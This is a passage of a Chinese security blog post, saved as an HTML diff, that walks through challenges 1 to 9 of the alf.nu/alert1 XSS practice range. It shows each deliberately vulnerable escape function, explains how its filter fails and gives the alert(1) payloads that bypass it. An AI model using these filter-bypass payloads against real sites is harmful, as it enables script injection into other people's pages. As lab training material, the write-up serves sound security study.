@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>XSS靶场练习（二） - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XSS靶场练习（二）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-06-14 09:51" pubdate>
+        2019年6月14日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      93
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XSS靶场练习（二）</h1>
+            
+            <div class="markdown-body">
+              <p>XSS靶场（alf.nu/alert1）部分题目详解（26/29），本文首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5391">先知社区</a></p>
+<a id="more"></a>
+
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近深感自己前端安全知识掌握的不是很好，于是找了个<a target="_blank" rel="noopener" href="https://alf.nu/alert1">XSS靶场</a>练习下，截止到2019年6月9日，网站上共有29道题目，我当前只做出了26道，还有3道题目没有头绪，分别是<code>Fruit 3</code>、<code>Quine</code>、<code>Entities 2</code>，当然已经做出的这些题目也不一定是最优解，希望与师傅们交流学习下，如果有发现什么错误，欢迎师傅们批评指正。</p>
+<p>我的链接</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://alf.nu/alert(<span class="hljs-number">1</span>)#accesstoken=WcMW<span class="hljs-number">1</span>j+qtfFu<span class="hljs-number">6</span>BQVFdJM<br></code></pre></td></tr></table></figure>
+<p>浏览器版本：<code>Chrome 74</code></p>
+<h2 id="1-Warmup"><a href="#1-Warmup" class="headerlink" title="1. Warmup"></a>1. Warmup</h2><h3 id="1-1-源码"><a href="#1-1-源码" class="headerlink" title="1.1 源码"></a>1.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h3 id="1-2-分析"><a href="#1-2-分析" class="headerlink" title="1.2 分析"></a>1.2 分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p>
+<h3 id="1-3-Payload"><a href="#1-3-Payload" class="headerlink" title="1.3 Payload"></a>1.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">13</span>个字符<br><span class="hljs-string">&quot;);alert(1)//</span><br><span class="hljs-string">12个字符</span><br><span class="hljs-string">&quot;</span>);alert(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://image.mengsec.com/xss-alf.nu/20190604213729.png" title="1"><img src="https://image.mengsec.com/xss-alf.nu/20190604213729.png" srcset="/img/loading.gif" alt="1" title="1"></a></p>
+<h2 id="2-Adobe"><a href="#2-Adobe" class="headerlink" title="2. Adobe"></a>2. Adobe</h2><h3 id="2-1-源码"><a href="#2-1-源码" class="headerlink" title="2.1 源码"></a>2.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = s.replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="2-2-分析"><a href="#2-2-分析" class="headerlink" title="2.2 分析"></a>2.2 分析</h3><p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p>
+<ul>
+<li>闭合之前的<code>&lt;script&gt;</code>标签，然后再写一个<code>&lt;script&gt;</code>。</li>
+<li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤。</li>
+</ul>
+<h3 id="2-3-Payload"><a href="#2-3-Payload" class="headerlink" title="2.3 Payload"></a>2.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">方法<span class="hljs-number">1</span> <span class="hljs-number">27</span>个字符<br>&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(1)/</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">方法2 14个字符</span><br><span class="hljs-regexp">\&quot;);alert(1)/</span><span class="hljs-regexp">/</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190604214819.png" srcset="/img/loading.gif"></p>
+<h2 id="3-JSON"><a href="#3-JSON" class="headerlink" title="3. JSON"></a>3. JSON</h2><h3 id="3-1-源码"><a href="#3-1-源码" class="headerlink" title="3.1 源码"></a>3.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = <span class="hljs-built_in">JSON</span>.stringify(s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + s + <span class="hljs-string">&#x27;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="3-2-分析"><a href="#3-2-分析" class="headerlink" title="3.2 分析"></a>3.2 分析</h3><p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p>
+<h3 id="3-3-Payload"><a href="#3-3-Payload" class="headerlink" title="3.3 Payload"></a>3.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(1)/</span><span class="hljs-regexp">/</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609151017.png" srcset="/img/loading.gif"></p>
+<h2 id="4-Markdown"><a href="#4-Markdown" class="headerlink" title="4. Markdown"></a>4. Markdown</h2><h3 id="4-1-源码"><a href="#4-1-源码" class="headerlink" title="4.1 源码"></a>4.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> text = s.replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>);<br>    <span class="hljs-comment">// URLs</span><br>    text = text.replace(<span class="hljs-regexp">/(http:\/\/\S+)/g</span>, <span class="hljs-string">&#x27;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&#x27;</span>);<br>    <span class="hljs-comment">// [[img123|Description]]</span><br>    text = text.replace(<span class="hljs-regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="hljs-string">&#x27;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> text;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="4-2-分析"><a href="#4-2-分析" class="headerlink" title="4.2 分析"></a>4.2 分析</h3><p>代码进行了三步操作</p>
+<ol>
+<li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li>
+<li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li>
+<li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为<code>&lt;img alt=&quot;Description&quot; src=&quot;img123.gif&quot;&gt;</code>。</li>
+</ol>
+<p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p>
+<h3 id="4-3-Payload"><a href="#4-3-Payload" class="headerlink" title="4.3 Payload"></a>4.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[[a|http:<span class="hljs-comment">//onerror=alert(1)//]]</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190604223045.png" srcset="/img/loading.gif"></p>
+<h2 id="5-DOM"><a href="#5-DOM" class="headerlink" title="5. DOM"></a>5. DOM</h2><h3 id="5-1-源码"><a href="#5-1-源码" class="headerlink" title="5.1 源码"></a>5.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// Slightly too lazy to make two input fields.</span><br>    <span class="hljs-comment">// Pass in something like &quot;TextNode#foo&quot;</span><br>    <span class="hljs-keyword">var</span> m = s.split(<span class="hljs-regexp">/#/</span>);<br><br>    <span class="hljs-comment">// Only slightly contrived at this point.</span><br>    <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    a.appendChild(<span class="hljs-built_in">document</span>[<span class="hljs-string">&#x27;create&#x27;</span> + m[<span class="hljs-number">0</span>]].apply(<span class="hljs-built_in">document</span>, m.slice(<span class="hljs-number">1</span>)));<br>    <span class="hljs-keyword">return</span> a.innerHTML;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="5-2-分析"><a href="#5-2-分析" class="headerlink" title="5.2 分析"></a>5.2 分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。<br>根据格式查一下手册</p>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609154441.png" srcset="/img/loading.gif"></p>
+<p>列一下几个常用的：</p>
+<ul>
+<li><code>createElement()</code> 创建一个元素节点</li>
+<li><code>createTextNode()</code> 创建一个文本节点</li>
+<li><code>createAttribute()</code> 创建一个属性节点</li>
+<li><code>createComment()</code> 创建一个注释节点</li>
+</ul>
+<p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p>
+<h3 id="5-3-Payload"><a href="#5-3-Payload" class="headerlink" title="5.3 Payload"></a>5.3 Payload</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">34</span>个字符<br>Comment#&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br><span class="hljs-number">32</span>个字符<br>Comment#&gt;&lt;iframe onload=alert(1)<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609154813.png" srcset="/img/loading.gif"></p>
+<h2 id="6-Callback"><a href="#6-Callback" class="headerlink" title="6. Callback"></a>6. Callback</h2><h3 id="6-1-源码"><a href="#6-1-源码" class="headerlink" title="6.1 源码"></a>6.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// Pass inn &quot;callback#userdata&quot;</span><br>    <span class="hljs-keyword">var</span> thing = s.split(<span class="hljs-regexp">/#/</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z\[\]&#x27;]*$/</span>.test(thing[<span class="hljs-number">0</span>])) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid callback&#x27;</span>;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        <span class="hljs-string">&#x27;userdata&#x27;</span>: thing[<span class="hljs-number">1</span>]<br>    &#125;;<br>    <span class="hljs-keyword">var</span> json = <span class="hljs-built_in">JSON</span>.stringify(obj).replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\u003c&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span> + thing[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;(&quot;</span> + json + <span class="hljs-string">&quot;)&lt;/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="6-2-分析"><a href="#6-2-分析" class="headerlink" title="6.2 分析"></a>6.2 分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p>
+<h3 id="6-3-Payload"><a href="#6-3-Payload" class="headerlink" title="6.3 Payload"></a>6.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;#&#x27;</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190605090815.png" srcset="/img/loading.gif"></p>
+<p>简单分析一下最终的执行过程，通过两个单引号闭合数据。在这里是<code>&#39;(&#123;&quot;userdata&quot;:&quot;&#39;</code>，在<code>alert(1)</code>后面加个注释符将后面的无效数据注释掉，也就是<code>//&quot;&#125;)</code>。剩余的代码也就成功执行了。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-string">&#x27;(&#123;&quot;userdata&quot;:&quot;&#x27;</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//&quot;&#125;)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="7-Skandia"><a href="#7-Skandia" class="headerlink" title="7. Skandia"></a>7. Skandia</h2><h3 id="7-1-源码"><a href="#7-1-源码" class="headerlink" title="7.1 源码"></a>7.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.toUpperCase() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="7-2-分析"><a href="#7-2-分析" class="headerlink" title="7.2 分析"></a>7.2 分析</h3><p>很容易就能闭合标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p>
+<h3 id="7-3-Payload"><a href="#7-3-Payload" class="headerlink" title="7.3 Payload"></a>7.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">54</span>个字符<br>&lt;/script&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190606100017.png" srcset="/img/loading.gif"></p>
+<h2 id="8-Template"><a href="#8-Template" class="headerlink" title="8. Template"></a>8. Template</h2><h3 id="8-1-源码"><a href="#8-1-源码" class="headerlink" title="8.1 源码"></a>8.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">htmlEscape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/./g</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">x</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>,<br>                <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<br>                <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>,<br>                <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>,<br>                <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span><br>            &#125;[x] || x;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expandTemplate</span>(<span class="hljs-params">template, args</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> template.replace(<br>            /&#123;(\w+)&#125;/g,<br>            <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">_, n</span>) </span>&#123;<br>                <span class="hljs-keyword">return</span> htmlEscape(args[n]);<br>            &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> expandTemplate(<br>        <span class="hljs-string">&quot;                                                \n\</span><br><span class="hljs-string">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span><br><span class="hljs-string">      &lt;script&gt;                                       \n\</span><br><span class="hljs-string">         var v = document.getElementById(&#x27;name&#x27;);    \n\</span><br><span class="hljs-string">         v.innerHTML = &#x27;&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;&#x27;;       \n\</span><br><span class="hljs-string">      &lt;\/script&gt;                                     \n\</span><br><span class="hljs-string">    &quot;</span>, &#123;<br>            name: s<br>        &#125;<br>    );<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="8-2-分析"><a href="#8-2-分析" class="headerlink" title="8.2 分析"></a>8.2 分析</h3><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>&#123;name&#125;</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p>
+<h3 id="8-3-Payload"><a href="#8-3-Payload" class="headerlink" title="8.3 Payload"></a>8.3 Payload</h3><p>需要注意的是第二个<code>Payload</code>末尾有一个空格。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">32</span>个字符<br>\x3cimg src onerror=alert(<span class="hljs-number">1</span>)\x3e<br><span class="hljs-number">26</span>个字符<br>\x3cstyle/onload=alert(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190606102148.png" srcset="/img/loading.gif"></p>
+<h2 id="9-JSON-2"><a href="#9-JSON-2" class="headerlink" title="9. JSON 2"></a>9. JSON 2</h2><h3 id="9-1-源码"><a href="#9-1-源码" class="headerlink" title="9.1 源码"></a>9.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = <span class="hljs-built_in">JSON</span>.stringify(s).replace(<span class="hljs-regexp">/&lt;\/script/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + s + <span class="hljs-string">&#x27;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="9-2-分析"><a href="#9-2-分析" class="headerlink" title="9.2 分析"></a>9.2 分析</h3><p>对<code>&lt;/script&gt;</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p>
+<p>由于直接将字符串替换为空，可以双写绕过。</p>
